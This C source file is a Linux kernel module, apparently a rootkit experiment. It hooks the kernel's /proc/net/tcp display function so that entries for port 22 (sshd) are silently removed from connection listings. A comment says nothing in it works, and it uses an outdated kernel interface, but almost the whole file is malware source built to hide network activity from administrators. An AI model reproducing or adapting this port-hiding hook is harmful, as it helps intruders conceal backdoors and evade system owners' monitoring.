#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/init.h>
#include <net/tcp.h>
/************************************************************************************************
 * NOTHING HERE WORKS, IT'S A DEAD-END PLAYGROUND
 ************************************************************************************************
/* form net/ipv4/tcp_ipv4.c */
#define TMPSZ 150

/* hide sshd */
#define PORT_TO_HIDE 22

MODULE_LICENSE ("GPL");

int (*old_tcp4_seq_show) (struct seq_file*, void*) = NULL;

char *strnstr(const char* haystack, const char* needle, size_t n){
	char* s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
	if (s-haystack + strlen(needle) <= n)
		return s;
	else
		return NULL;
}

int hacked_tcp4_seq_show(struct seq_file* seq, void* v){
	int retval=old_tcp4_seq_show(seq, v);
	char port[12];
	sprintf(port, "%04X", PORT_TO_HIDE);

	/* remove port from display */
	if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
		seq->count -= TMPSZ;
	return retval;
}

static int __init init_port_hide(void){
	struct tcp_seq_afinfo* afinfo = NULL;
	struct proc_dir_entry* dir_entry = proc_net->subdir;

	while (strcmp(dir_entry->name, "tcp"))
		dir_entry = dir_entry->next;

	if ((afinfo = (struct tcp_seq_afinfo*)dir_entry->data)) {
		old_tcp4_seq_show = afinfo->seq_ops.show;
		afinfo->seq_ops.show  = hacked_tcp4_seq_show;
	}
	return 0;
}

static void exit_port_hide(void){
	struct tcp_seq_afinfo* afinfo = NULL;
	struct proc_dir_entry* dir_entry = proc_net->subdir;

	while (strcmp(dir_entry->name, "tcp"))
		dir_entry = dir_entry->next;

	if ((afinfo = (struct tcp_seq_afinfo*)dir_entry->data )) {
		afinfo->seq_ops.show = old_tcp4_seq_show;
	}
}

#ifdef DISABLED_HELLO
static int __init hello(void){
	printk (KERN_ALERT "Hello world!\n");
	return 0;
}

static void goodbye (void){
	printk (KERN_ALERT "Goodbye!\n");
}


module_init(hello);
module_exit(goodbye);
#endif

module_init(init_port_hide);
module_exit(exit_port_hide);
